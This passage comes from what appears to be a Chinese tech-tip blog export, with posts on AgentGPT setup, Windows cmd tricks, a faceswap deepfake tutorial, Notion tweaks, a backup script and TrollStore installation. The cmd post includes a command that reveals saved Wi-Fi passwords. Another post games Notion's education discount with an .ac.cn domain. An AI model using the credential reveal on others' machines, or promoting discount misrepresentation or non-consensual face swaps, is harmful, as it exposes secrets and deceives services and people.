<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/reworkd/AgentGPT.git</span><br></pre></td></tr></table></figure>
<p>5.下载后执行下面安装命令即可:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> AgentGPT</span><br><span class="line"></span><br><span class="line">./setup.sh --docker</span><br></pre></td></tr></table></figure>
<h1 id="6-获取自己的Open-AI-的密钥：https-platform-openai-com-account-api-keys"><a href="#6-获取自己的Open-AI-的密钥：https-platform-openai-com-account-api-keys" class="headerlink" title="6.获取自己的Open AI 的密钥：https://platform.openai.com/account/api-keys"></a>6.获取自己的Open AI 的密钥：<a href="https://platform.openai.com/account/api-keys">https://platform.openai.com/account/api-keys</a></h1><h1 id="7-安装完成以后，你只需在浏览器上打开：http-xxx-xx-xx-xx-3000"><a href="#7-安装完成以后，你只需在浏览器上打开：http-xxx-xx-xx-xx-3000" class="headerlink" title="7.安装完成以后，你只需在浏览器上打开：http:xxx.xx.xx.xx:3000"></a>7.安装完成以后，你只需在浏览器上打开：http:xxx.xx.xx.xx:3000</h1>]]></content>
      <categories>
        <category>ai</category>
        <category>chatgpt</category>
      </categories>
      <tags>
        <tag>chatgpt</tag>
        <tag>ai</tag>
        <tag>agentgpt</tag>
      </tags>
  </entry>
  <entry>
    <title>视频去水印网站和软件</title>
    <url>/posts/3396c573/</url>
    <content><![CDATA[<p>Watermark Remover Online<br><a href="https://www.aiseesoft.com/watermark-remover-online/">https://www.aiseesoft.com/watermark-remover-online/</a></p>
<p>Unscreen<br><a href="https://www.unscreen.com/">https://www.unscreen.com/</a></p>
<p>HitPaw Watermark Remover</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>watermark</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>watermark</tag>
      </tags>
  </entry>
  <entry>
    <title>如何安装 chatgpt 手机客户端？ 支持 ios 和安卓手机</title>
    <url>/posts/547ba092/</url>
    <content><![CDATA[<h1 id="1-首选需要在手机上安装快捷指令管理器：Shortcuts"><a href="#1-首选需要在手机上安装快捷指令管理器：Shortcuts" class="headerlink" title="1.首选需要在手机上安装快捷指令管理器：Shortcuts"></a>1.首选需要在手机上安装快捷指令管理器：Shortcuts</h1><p>【iOS版】<a href="https://apps.apple.com/us/app/shortcuts/id915249334">https://apps.apple.com/us/app/shortcuts/id915249334</a><br>【Android版】<a href="https://play.google.com/store/apps/details?id=any.shortcut&pli=1">https://play.google.com/store/apps/details?id=any.shortcut&amp;pli=1</a></p>
<h1 id="2-在手机上下载ChatGPT的-ico-图标："><a href="#2-在手机上下载ChatGPT的-ico-图标：" class="headerlink" title="2.在手机上下载ChatGPT的 ico 图标："></a>2.在手机上下载ChatGPT的 ico 图标：</h1><p><img src="/img/chatgpt/1.webp" alt="chatgpt-icon"></p>
<h1 id="3-添加下面的快捷指令：Make-app-from-URL"><a href="#3-添加下面的快捷指令：Make-app-from-URL" class="headerlink" title="3.添加下面的快捷指令：Make app from URL"></a>3.添加下面的快捷指令：Make app from URL</h1><p><a href="https://www.icloud.com/shortcuts/a8d6943813db4fe7a2c17eb7cd50a100">https://www.icloud.com/shortcuts/a8d6943813db4fe7a2c17eb7cd50a100</a></p>
<h1 id="4-填写ChatGPT的登入链接："><a href="#4-填写ChatGPT的登入链接：" class="headerlink" title="4.填写ChatGPT的登入链接："></a>4.填写ChatGPT的登入链接：</h1><p><a href="https://chat.openai.com/auth/login">https://chat.openai.com/auth/login</a><br>注意:链接不要有空格，否则会出现白屏或黑屏！</p>
]]></content>
      <categories>
        <category>ai</category>
        <category>chatgpt</category>
      </categories>
      <tags>
        <tag>chatgpt</tag>
        <tag>ai</tag>
      </tags>
  </entry>
  <entry>
    <title>cmd 进阶命令</title>
    <url>/posts/cb6f1a03/</url>
    <content><![CDATA[<h1 id="可以壮胆的约会美女同事的发送指令："><a href="#可以壮胆的约会美女同事的发送指令：" class="headerlink" title="可以壮胆的约会美女同事的发送指令："></a>可以壮胆的约会美女同事的发送指令：</h1><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">MSG /server:<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">101</span> * &quot;小美，下班后一起去吃饭呐，我是办公室里大壮！&quot;</span><br></pre></td></tr></table></figure>
<h1 id="通过cmd实现仿黑客帝国数字雨的代码："><a href="#通过cmd实现仿黑客帝国数字雨的代码：" class="headerlink" title="通过cmd实现仿黑客帝国数字雨的代码："></a>通过cmd实现仿黑客帝国数字雨的代码：</h1><blockquote>
<p>保存为 .cmd文件</p>
</blockquote>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off  </span><br><span class="line">:line </span><br><span class="line"><span class="built_in">color</span> <span class="number">0</span>a</span><br><span class="line"><span class="built_in">setlocal</span> ENABLEDELAYEDEXPANSION  </span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> /l <span class="variable">%%i</span> <span class="keyword">in</span> (<span class="number">0</span>) <span class="keyword">do</span> (  </span><br><span class="line"><span class="built_in">set</span> &quot;line=&quot;  </span><br><span class="line"><span class="keyword">for</span> /l <span class="variable">%%j</span> <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">80</span>) <span class="keyword">do</span> (  </span><br><span class="line"><span class="built_in">set</span> /a Down<span class="variable">%%j</span>-=<span class="number">2</span>  </span><br><span class="line"><span class="built_in">set</span> &quot;x=<span class="variable">!Down%%j!</span>&quot;  </span><br><span class="line"><span class="keyword">if</span> <span class="variable">!x!</span> <span class="keyword">LSS</span> <span class="number">0</span> (  </span><br><span class="line"><span class="built_in">set</span> /a Arrow<span class="variable">%%j</span>=<span class="variable">!random!</span><span class="variable">%%3</span>  </span><br><span class="line"><span class="built_in">set</span> /a Down<span class="variable">%%j</span>=<span class="variable">!random!</span><span class="variable">%%1</span>5+<span class="number">10</span>  </span><br><span class="line">)  </span><br><span class="line"><span class="built_in">set</span> &quot;x=<span class="variable">!Arrow%%j!</span>&quot;  </span><br><span class="line"><span class="keyword">if</span> &quot;<span class="variable">!x!</span>&quot; == &quot;<span class="number">2</span>&quot; (  </span><br><span class="line"><span class="built_in">set</span> &quot;line=<span class="variable">!line!</span><span class="variable">!random:~-1!</span> &quot;  </span><br><span class="line">) <span class="keyword">else</span> (<span class="built_in">set</span> &quot;line=<span class="variable">!line!</span> &quot;)  </span><br><span class="line">)  </span><br><span class="line"><span class="built_in">set</span> /p=<span class="variable">!line!</span>&lt;<span class="built_in">nul</span>  </span><br><span class="line">)  </span><br><span class="line"><span class="keyword">goto</span> line</span><br></pre></td></tr></table></figure>
<h1 id="列出连接过的wifi名称和详细信息包括密码"><a href="#列出连接过的wifi名称和详细信息包括密码" class="headerlink" title="列出连接过的wifi名称和详细信息包括密码"></a>列出连接过的wifi名称和详细信息包括密码</h1><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">#显示wifi列表</span><br><span class="line">netsh wlan show profiles</span><br><span class="line">#查密码</span><br><span class="line">netsh wlan show profile name=&quot;wifi名称&quot; key=clear</span><br></pre></td></tr></table></figure>
<h1 id="显示外网ip地址"><a href="#显示外网ip地址" class="headerlink" title="显示外网ip地址"></a>显示外网ip地址</h1><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">curl -L ip.tool.lu</span><br></pre></td></tr></table></figure>
<h1 id="远程控制内网电脑"><a href="#远程控制内网电脑" class="headerlink" title="远程控制内网电脑"></a>远程控制内网电脑</h1><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">mstsc</span><br></pre></td></tr></table></figure>
<h1 id="查看用户列表"><a href="#查看用户列表" class="headerlink" title="查看用户列表"></a>查看用户列表</h1><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">#用户列表</span><br><span class="line"><span class="built_in">net</span> user</span><br><span class="line">#删除某个用户</span><br><span class="line"><span class="built_in">net</span> user hacker /<span class="built_in">del</span></span><br></pre></td></tr></table></figure>
<h1 id="扫描电脑修复问题"><a href="#扫描电脑修复问题" class="headerlink" title="扫描电脑修复问题"></a>扫描电脑修复问题</h1><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">sfc /scannow</span><br></pre></td></tr></table></figure>
<h1 id="预定时间关机"><a href="#预定时间关机" class="headerlink" title="预定时间关机"></a>预定时间关机</h1><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">#<span class="number">5</span>分钟（<span class="number">300</span>秒）后关机</span><br><span class="line">shutdown /s /t <span class="number">300</span></span><br><span class="line">#取消关机</span><br><span class="line">shutdown /a</span><br></pre></td></tr></table></figure>
<h1 id="覆写硬盘空间（以防recuva等软件恢复被删除文件）"><a href="#覆写硬盘空间（以防recuva等软件恢复被删除文件）" class="headerlink" title="覆写硬盘空间（以防recuva等软件恢复被删除文件）"></a>覆写硬盘空间（以防recuva等软件恢复被删除文件）</h1><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">cipher /w:D:</span><br></pre></td></tr></table></figure>
<h1 id="文件加密，只有本机用户才能访问（解密-d）"><a href="#文件加密，只有本机用户才能访问（解密-d）" class="headerlink" title="文件加密，只有本机用户才能访问（解密&#x2F;d）"></a>文件加密，只有本机用户才能访问（解密&#x2F;d）</h1><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">cipher /e D:\文件名</span><br></pre></td></tr></table></figure>
<h1 id="文件夹加密，文件夹里所有文件加密（解密-d）"><a href="#文件夹加密，文件夹里所有文件加密（解密-d）" class="headerlink" title="文件夹加密，文件夹里所有文件加密（解密&#x2F;d）"></a>文件夹加密，文件夹里所有文件加密（解密&#x2F;d）</h1><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">cipher /e /s:D:\文件夹\</span><br></pre></td></tr></table></figure>
<blockquote>
<p>非本机用户访问加密文件：系统搜索“加密”，管理文件加密证书，导出证书</p>
</blockquote>
<h1 id="网络链路诊断（查访问指定网络的跳转过程）"><a href="#网络链路诊断（查访问指定网络的跳转过程）" class="headerlink" title="网络链路诊断（查访问指定网络的跳转过程）"></a>网络链路诊断（查访问指定网络的跳转过程）</h1><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">tracert www.baidu.com</span><br></pre></td></tr></table></figure>
<h1 id="激活win11绕过联网（电脑重启后无需联网激活）"><a href="#激活win11绕过联网（电脑重启后无需联网激活）" class="headerlink" title="激活win11绕过联网（电脑重启后无需联网激活）"></a>激活win11绕过联网（电脑重启后无需联网激活）</h1><blockquote>
<p>shift+F10打开cmd输入</p>
</blockquote>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">oobe \bypassnro</span><br></pre></td></tr></table></figure>
<h1 id="启动IE浏览器"><a href="#启动IE浏览器" class="headerlink" title="启动IE浏览器"></a>启动IE浏览器</h1><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">CreateObject(&quot;InternetExplorer.Application&quot;).Visible=true</span><br></pre></td></tr></table></figure>
<blockquote>
<p>将命令行写入文本改后缀.vbs</p>
</blockquote>
]]></content>
      <categories>
        <category>os</category>
        <category>windows</category>
        <category>cmd</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>windows</tag>
        <tag>cmd</tag>
      </tags>
  </entry>
  <entry>
    <title>faceswap 视频换脸软件</title>
    <url>/posts/77c274f3/</url>
    <content><![CDATA[<p>官网<br><a href="https://faceswap.dev/">https://faceswap.dev/</a><br>下载地址<br><a href="https://github.com/deepfakes/faceswap/releases/tag/v2.0.0">https://github.com/deepfakes/faceswap/releases/tag/v2.0.0</a></p>
<p>另外一个免费开源换脸程序 DeepFaceLab<br><a href="https://github.com/iperov/DeepFaceLab">https://github.com/iperov/DeepFaceLab</a></p>
<h1 id="A视频：被替换的面"><a href="#A视频：被替换的面" class="headerlink" title="A视频：被替换的面"></a>A视频：被替换的面</h1><h1 id="B视频：替换的面"><a href="#B视频：替换的面" class="headerlink" title="B视频：替换的面"></a>B视频：替换的面</h1><h1 id="1-提取-Extract"><a href="#1-提取-Extract" class="headerlink" title="1.提取 Extract"></a>1.提取 Extract</h1><p>Input Dir——导入A视频<br>Output Dir——新建导出A文件夹（路径不能有中文字符）<br>拉到最下面Extract导出每一帧的画面</p>
<p>Input Dir——导入B视频<br>Output Dir——新建导出B文件夹（路径不能有中文字符）<br>拉到最下面Extract导出每一帧的画面</p>
<h1 id="2-训练-Train"><a href="#2-训练-Train" class="headerlink" title="2.训练 Train"></a>2.训练 Train</h1><h2 id="Faces"><a href="#Faces" class="headerlink" title="Faces"></a>Faces</h2><p>Input A——选A文件夹<br>Input B——选B文件夹</p>
<h2 id="Model"><a href="#Model" class="headerlink" title="Model"></a>Model</h2><p>Model Dir——新建存放模型的C文件夹</p>
<h2 id="Training——Batch-Size（根据显卡性能适当调整）"><a href="#Training——Batch-Size（根据显卡性能适当调整）" class="headerlink" title="Training——Batch Size（根据显卡性能适当调整）"></a>Training——Batch Size（根据显卡性能适当调整）</h2><h2 id="延时-Timelapse"><a href="#延时-Timelapse" class="headerlink" title="延时 Timelapse"></a>延时 Timelapse</h2><p>Timelapse Input A——A文件夹<br>Timelapse Input B——B文件夹<br>Timelapse Output——新建存D文件夹<br>点击Train</p>
<h1 id="3-合成-Convert"><a href="#3-合成-Convert" class="headerlink" title="3.合成 Convert"></a>3.合成 Convert</h1><p>Input Dir——A文件夹<br>Output Dir——桌面<br>Model Dir——C文件夹</p>
<h2 id="Plugins——Match-Hist"><a href="#Plugins——Match-Hist" class="headerlink" title="Plugins——Match-Hist"></a>Plugins——Match-Hist</h2><h2 id="Writer——Ffmpeg"><a href="#Writer——Ffmpeg" class="headerlink" title="Writer——Ffmpeg"></a>Writer——Ffmpeg</h2><p>点击Convert</p>
]]></content>
      <categories>
        <category>ai</category>
        <category>faceswap</category>
      </categories>
      <tags>
        <tag>ai</tag>
        <tag>faceswap</tag>
      </tags>
  </entry>
  <entry>
    <title>notion 实现全平台的中文汉化教程</title>
    <url>/posts/db830852/</url>
    <content><![CDATA[<h1 id="1-Nation软件客户端添加中文语言："><a href="#1-Nation软件客户端添加中文语言：" class="headerlink" title="1.Nation软件客户端添加中文语言："></a>1.Nation软件客户端添加中文语言：</h1><p><a href="https://github.com/Reamd7/notion-zh_CN/releases">https://github.com/Reamd7/notion-zh_CN/releases</a></p>
<h1 id="2-Nation网页端汉化：【油猴脚本】"><a href="#2-Nation网页端汉化：【油猴脚本】" class="headerlink" title="2.Nation网页端汉化：【油猴脚本】"></a>2.Nation网页端汉化：【油猴脚本】</h1><p><a href="https://greasyfork.org/zh-CN/scripts/430116-notion-zh-cn-notion%E7%9A%84%E6%B1%89%E5%8C%96%E8%84%9A%E6%9C%AC">https://greasyfork.org/zh-CN/scripts/430116-notion-zh-cn-notion%E7%9A%84%E6%B1%89%E5%8C%96%E8%84%9A%E6%9C%AC</a></p>
<h1 id="3-手机客户端：【安卓版】"><a href="#3-手机客户端：【安卓版】" class="headerlink" title="3.手机客户端：【安卓版】"></a>3.手机客户端：【安卓版】</h1><p><a href="https://github.com/Reamd7/notion-zh_CN/blob/main/apk/Notion_0.6.1122.beta(7122)_zh_cn.apk">https://github.com/Reamd7/notion-zh_CN/blob/main/apk/Notion_0.6.1122.beta(7122)_zh_cn.apk</a></p>
]]></content>
      <categories>
        <category>tools</category>
        <category>notion</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>notion</tag>
      </tags>
  </entry>
  <entry>
    <title>自定义域名代替notion的分享链接作为公开博客</title>
    <url>/posts/5f85bbb2/</url>
    <content><![CDATA[<h1 id="1-申请域名"><a href="#1-申请域名" class="headerlink" title="1.申请域名"></a>1.申请域名</h1><p>申请网站：腾讯云，阿里云、NameSilo、Freenom（免费）</p>
<h1 id="2-域名服务器-cloudflare"><a href="#2-域名服务器-cloudflare" class="headerlink" title="2.域名服务器 cloudflare"></a>2.域名服务器 cloudflare</h1><p><a href="https://dash.cloudflare.com/">https://dash.cloudflare.com</a></p>
<h2 id="1-注册-Cloudflare"><a href="#1-注册-Cloudflare" class="headerlink" title="(1)注册 Cloudflare"></a>(1)注册 Cloudflare</h2><h2 id="2-添加站点"><a href="#2-添加站点" class="headerlink" title="(2)添加站点"></a>(2)添加站点</h2><p>添加你购买的域名，不用加www.</p>
<h2 id="3-更改DNS服务器"><a href="#3-更改DNS服务器" class="headerlink" title="(3)更改DNS服务器"></a>(3)更改DNS服务器</h2><p>在Cloudflare的DNS页面下，有Cloudflare名称服务器<br><img src="/img/notion2/1.webp" alt="image-1684058410580"></p>
<h2 id="4-进入购买域名的网站（腾讯云，阿里云、NameSilo、Freenom）后台，将默认的DNS服务器改为Cloudflare的DNS服务器"><a href="#4-进入购买域名的网站（腾讯云，阿里云、NameSilo、Freenom）后台，将默认的DNS服务器改为Cloudflare的DNS服务器" class="headerlink" title="(4)进入购买域名的网站（腾讯云，阿里云、NameSilo、Freenom）后台，将默认的DNS服务器改为Cloudflare的DNS服务器"></a>(4)进入购买域名的网站（腾讯云，阿里云、NameSilo、Freenom）后台，将默认的DNS服务器改为Cloudflare的DNS服务器</h2><h1 id="1-设置Cloudflare的DNS"><a href="#1-设置Cloudflare的DNS" class="headerlink" title="1.设置Cloudflare的DNS"></a>1.设置Cloudflare的DNS</h1><p>类型：CNAME<br>名称：www (或者子域名)<br>目标：notion.so<br><img src="/img/notion2/2.webp" alt="image"><br><img src="/img/notion2/3.webp" alt="image-1684056461267"></p>
<h1 id="2-创建Workers"><a href="#2-创建Workers" class="headerlink" title="2.创建Workers"></a>2.创建Workers</h1><p>点击创建击Worker<br><img src="/img/notion2/4.webp" alt="image-1684056488673"></p>
<h1 id="3-生成notion分享链接"><a href="#3-生成notion分享链接" class="headerlink" title="3.生成notion分享链接"></a>3.生成notion分享链接</h1><p>因为是网站是基于notion的，所以需要notion分享链接，准备好分享链接<br><img src="/img/notion2/5.webp" alt="image-1684056532661"></p>
<h1 id="4-生成代码并替换"><a href="#4-生成代码并替换" class="headerlink" title="4.生成代码并替换"></a>4.生成代码并替换</h1><p>进入网站(2选1）<br><a href="https://fruitionsite.com/">https://fruitionsite.com/</a><br><a href="https://fruition-stephenou.vercel.app/">https://fruition-stephenou.vercel.app/</a><br>Step 2: Customize and generate the script (2 mins)<br>填入域名和notion分享地址之后，自动会生成代码，复制一下<br><img src="/img/notion2/6.webp" alt="image-1684056561257"><br>快速编辑里删除原有代码，粘贴已经复制的脚本，保存并部署<br><img src="/img/notion2/7.webp" alt="image-1684056588367"><br><img src="/img/notion2/8.webp" alt="image-1684056638718"></p>
<h1 id="5-添加路由"><a href="#5-添加路由" class="headerlink" title="5.添加路由"></a>5.添加路由</h1><p>点击Workers，选择添加路由<br><img src="/img/notion2/9.webp" alt="image-1684056661996"><br>完整域名后面加&#x2F;*，worker选择刚才部署的即可<br><img src="/img/notion2/10.webp" alt="image-1684056680228"></p>
<h1 id="6创建页面规则（可选）"><a href="#6创建页面规则（可选）" class="headerlink" title="6创建页面规则（可选）"></a>6创建页面规则（可选）</h1><p><img src="/img/notion2/11.webp" alt="image-1684056699394"></p>
<h1 id="7-SSL-TLS——边缘证书——始终使用-HTTPS（可选）"><a href="#7-SSL-TLS——边缘证书——始终使用-HTTPS（可选）" class="headerlink" title="7. SSL&#x2F;TLS——边缘证书——始终使用 HTTPS（可选）"></a>7. SSL&#x2F;TLS——边缘证书——始终使用 HTTPS（可选）</h1><h1 id="8-速度——优化——Auto-Minify——JavaScript、CSS、HTML全勾选（可选）"><a href="#8-速度——优化——Auto-Minify——JavaScript、CSS、HTML全勾选（可选）" class="headerlink" title="8. 速度——优化——Auto Minify——JavaScript、CSS、HTML全勾选（可选）"></a>8. 速度——优化——Auto Minify——JavaScript、CSS、HTML全勾选（可选）</h1><h1 id="9-这时候你再去访问自己的域名，看到的就是你-Notion-的页面了。"><a href="#9-这时候你再去访问自己的域名，看到的就是你-Notion-的页面了。" class="headerlink" title="9. 这时候你再去访问自己的域名，看到的就是你 Notion 的页面了。"></a>9. 这时候你再去访问自己的域名，看到的就是你 Notion 的页面了。</h1>]]></content>
      <categories>
        <category>tools</category>
        <category>notion</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>notion</tag>
      </tags>
  </entry>
  <entry>
    <title>腾讯云注册ac.cn域名解析企业微信邮箱后缀，注册notion的教育增强版账户</title>
    <url>/posts/aabdf533/</url>
    <content><![CDATA[<h1 id="原理是Notion支持-edu-cn，也支持-ac-cn，用来申请教育优惠"><a href="#原理是Notion支持-edu-cn，也支持-ac-cn，用来申请教育优惠" class="headerlink" title="原理是Notion支持 @.edu.cn，也支持 @.ac.cn，用来申请教育优惠"></a>原理是Notion支持 <em><strong>@</strong></em>.edu.cn，也支持 <em><strong>@</strong></em>.ac.cn，用来申请教育优惠</h1><h1 id="1-我们需要一个-ac-cn的注册域名，以腾讯云为例"><a href="#1-我们需要一个-ac-cn的注册域名，以腾讯云为例" class="headerlink" title="1.我们需要一个.ac.cn的注册域名，以腾讯云为例"></a>1.我们需要一个.ac.cn的注册域名，以腾讯云为例</h1><h1 id="2-我们需要注册一个企业微信，自己作为管理员"><a href="#2-我们需要注册一个企业微信，自己作为管理员" class="headerlink" title="2.我们需要注册一个企业微信，自己作为管理员"></a>2.我们需要注册一个企业微信，自己作为管理员</h1><h1 id="3-我们将域名解析到企业微信邮箱，让域名作为你的邮箱后缀"><a href="#3-我们将域名解析到企业微信邮箱，让域名作为你的邮箱后缀" class="headerlink" title="3.我们将域名解析到企业微信邮箱，让域名作为你的邮箱后缀"></a>3.我们将域名解析到企业微信邮箱，让域名作为你的邮箱后缀</h1><p><img src="/img/notion/1.webp" alt="1"><br><img src="/img/notion/2.webp" alt="2"><br><img src="/img/notion/3.webp" alt="微信图片_20230515111219"><br><img src="/img/notion/4.webp" alt="11"></p>
<h1 id="4-用这个企业微信邮箱-ac-cn-去注册Notion账户激活教育优惠版"><a href="#4-用这个企业微信邮箱-ac-cn-去注册Notion账户激活教育优惠版" class="headerlink" title="4.用这个企业微信邮箱 @.ac.cn 去注册Notion账户激活教育优惠版"></a>4.用这个企业微信邮箱 <em><strong>@</strong></em>.ac.cn 去注册Notion账户激活教育优惠版</h1><p><img src="/img/notion/5.webp" alt="123"></p>
]]></content>
      <categories>
        <category>tools</category>
        <category>notion</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>notion</tag>
      </tags>
  </entry>
  <entry>
    <title>bash 脚本备份 halo 博客到另一个服务器</title>
    <url>/posts/1cfba232/</url>
    <content><![CDATA[<p>以下是一个使用 bash 脚本备份 Halo 博客的示例。这个脚本使用 rsync 命令复制文件到远程服务器上，并压缩备份文件。</p>
<p>请注意，以下脚本仅供参考。在使用之前，您需要根据自己的需求修改变量和设置。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置变量</span></span><br><span class="line">BACKUP_DIR=<span class="string">&quot;/path/to/backup/directory&quot;</span> <span class="comment"># 备份目录</span></span><br><span class="line">LOG_FILE=<span class="string">&quot;/path/to/backup/log/file.log&quot;</span> <span class="comment"># 日志文件</span></span><br><span class="line">RSYNC_USER=<span class="string">&quot;remote-username&quot;</span> <span class="comment"># 远程服务器用户名</span></span><br><span class="line">RSYNC_HOST=<span class="string">&quot;remote-hostname&quot;</span> <span class="comment"># 远程服务器主机名或 IP 地址</span></span><br><span class="line">RSYNC_PATH=<span class="string">&quot;/path/to/remote/directory&quot;</span> <span class="comment"># 远程服务器目录</span></span><br><span class="line">EXCLUDE_FILE=<span class="string">&quot;/path/to/exclude/file.txt&quot;</span> <span class="comment"># 排除文件列表</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建备份目录</span></span><br><span class="line"><span class="built_in">mkdir</span> -p <span class="string">&quot;<span class="variable">$BACKUP_DIR</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成备份文件名</span></span><br><span class="line">BACKUP_FILENAME=<span class="string">&quot;halo-<span class="subst">$(date +%Y-%m-%d-%H%M%S)</span>.tar.gz&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 备份博客文件到备份目录</span></span><br><span class="line">tar -czf <span class="string">&quot;<span class="variable">$BACKUP_DIR</span>/<span class="variable">$BACKUP_FILENAME</span>&quot;</span> /path/to/halo/blog</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 rsync 命令将备份文件上传到远程服务器</span></span><br><span class="line">rsync -avz -e ssh --exclude-from=<span class="string">&quot;<span class="variable">$EXCLUDE_FILE</span>&quot;</span> <span class="string">&quot;<span class="variable">$BACKUP_DIR</span>/<span class="variable">$BACKUP_FILENAME</span>&quot;</span> <span class="string">&quot;<span class="variable">$RSYNC_USER</span>@<span class="variable">$RSYNC_HOST</span>:<span class="variable">$RSYNC_PATH</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 记录备份信息到日志文件</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="subst">$(date +%Y-%m-%d-%H%M%S)</span> - Backup created: <span class="variable">$BACKUP_FILENAME</span>&quot;</span> &gt;&gt; <span class="string">&quot;<span class="variable">$LOG_FILE</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除旧的备份文件</span></span><br><span class="line">find <span class="string">&quot;<span class="variable">$BACKUP_DIR</span>&quot;</span> -<span class="built_in">type</span> f -name <span class="string">&quot;*.tar.gz&quot;</span> -mtime +7 -delete</span><br></pre></td></tr></table></figure>

<p>您需要修改的变量是：</p>
<p>BACKUP_DIR: 备份文件存放的目录。<br>LOG_FILE: 日志文件的路径和文件名。<br>RSYNC_USER: 远程服务器的用户名。<br>RSYNC_HOST: 远程服务器的主机名或 IP 地址。<br>RSYNC_PATH: 远程服务器存放备份文件的目录。<br>EXCLUDE_FILE: 排除不需要备份的文件列表。<br>在此脚本中，我们使用了 tar 命令将博客文件打包成备份文件，并使用 rsync 命令将备份文件上传到远程服务器。我们还记录了备份信息到日志文件，并删除了七天前的旧备份文件。</p>
<p>请注意，此脚本需要定期运行，以自动备份您的博客。您可以使用 cron 作业或其他定时工具来实现自动运行。</p>
]]></content>
      <categories>
        <category>web</category>
        <category>halo</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>halo</tag>
      </tags>
  </entry>
  <entry>
    <title>trollstore巨魔商店永久安装app，永不过期</title>
    <url>/posts/b521685b/</url>
    <content><![CDATA[<p>TrollStore 是由opa334dev开发的软件。简单点说，它可以给你的iPhone和iPad安装任何你想要安装的APP软件，而且不需要越狱。</p>
<p>TrollStore 正式利用了CoreTrust 漏洞，这是由著名的LinuHenze发现的苹果证书签名Bug，这个Bug存在目前已知的iOS14.0~15.4.1 、15.5 Beta 4中。</p>
<p>TrollStore 安装的任何APP，永远不用担心证书签名过期的问题，不再需要个人签名和企业签名。</p>
<h1 id="TrollStore巨魔商店特点："><a href="#TrollStore巨魔商店特点：" class="headerlink" title="TrollStore巨魔商店特点："></a>TrollStore巨魔商店特点：</h1><p>只支持 iOS 14.0 – 15.4.1<br>iOS 15.4.1 ~ 16.4.1 不支持 （除了换手机没有任何办法）<br>iOS 10.0 ~ 14.0 不支持（除了换手机没有任何办法）<br>巨魔作者说: 永远不支持除14.0~15.4.1的任何版本。</p>
<h1 id="安装教程（推荐）："><a href="#安装教程（推荐）：" class="headerlink" title="安装教程（推荐）："></a>安装教程（推荐）：</h1><h2 id="1，打开iPhone-iPad上的Safari浏览器，"><a href="#1，打开iPhone-iPad上的Safari浏览器，" class="headerlink" title="1，打开iPhone &#x2F; iPad上的Safari浏览器，"></a>1，打开iPhone &#x2F; iPad上的Safari浏览器，</h2><p>iPhone 6S ~ X （14.0~14.8.1）需要使用checkra1n越狱后，Cydia添加源havoc.app</p>
<p>iPhone 6S ~ X （15.0~15.4.1）点这个链接安装：<br><a href="https://api.jailbreaks.app/troll">https://api.jailbreaks.app/troll</a></p>
<p>iPhone XR ~ 13 ProMax （14.0~14.8.1）点这个链接安装：<a href="https://api.jailbreaks.app/troll64e">https://api.jailbreaks.app/troll64e</a> </p>
<p>iPhone XR ~ 13 ProMax （15.0~15.4.1）点这个链接安装：<br><a href="https://api.jailbreaks.app/troll">https://api.jailbreaks.app/troll</a> </p>
<p>注意：请根据机型选择，选错是不会安装成功的！！！不支持的iOS版本不用试，肯定不支持，试了也是白费功夫，不要幻想。最好办法是换手机！</p>
<h2 id="2-在弹窗的界面中，选择安装。"><a href="#2-在弹窗的界面中，选择安装。" class="headerlink" title="2.在弹窗的界面中，选择安装。"></a>2.在弹窗的界面中，选择安装。</h2><h2 id="3-手机主屏幕上会有一个“GTA-Car-Tracker”应用程序；这个是正常的，点击进去，点击-Install-TrollStore开始安装。"><a href="#3-手机主屏幕上会有一个“GTA-Car-Tracker”应用程序；这个是正常的，点击进去，点击-Install-TrollStore开始安装。" class="headerlink" title="3.手机主屏幕上会有一个“GTA Car Tracker”应用程序；这个是正常的，点击进去，点击 Install TrollStore开始安装。"></a>3.手机主屏幕上会有一个“GTA Car Tracker”应用程序；这个是正常的，点击进去，点击 Install TrollStore开始安装。</h2><h2 id="4-点击install-TrollStore开始安装巨魔商店。安装完成后就可以使用了。（如果有科学上网、魔法加速、或者梯子更容易安装-没有的话很难安装成功。）"><a href="#4-点击install-TrollStore开始安装巨魔商店。安装完成后就可以使用了。（如果有科学上网、魔法加速、或者梯子更容易安装-没有的话很难安装成功。）" class="headerlink" title="4.点击install TrollStore开始安装巨魔商店。安装完成后就可以使用了。（如果有科学上网、魔法加速、或者梯子更容易安装,没有的话很难安装成功。）"></a>4.点击install TrollStore开始安装巨魔商店。安装完成后就可以使用了。（如果有科学上网、魔法加速、或者梯子更容易安装,没有的话很难安装成功。）</h2><h2 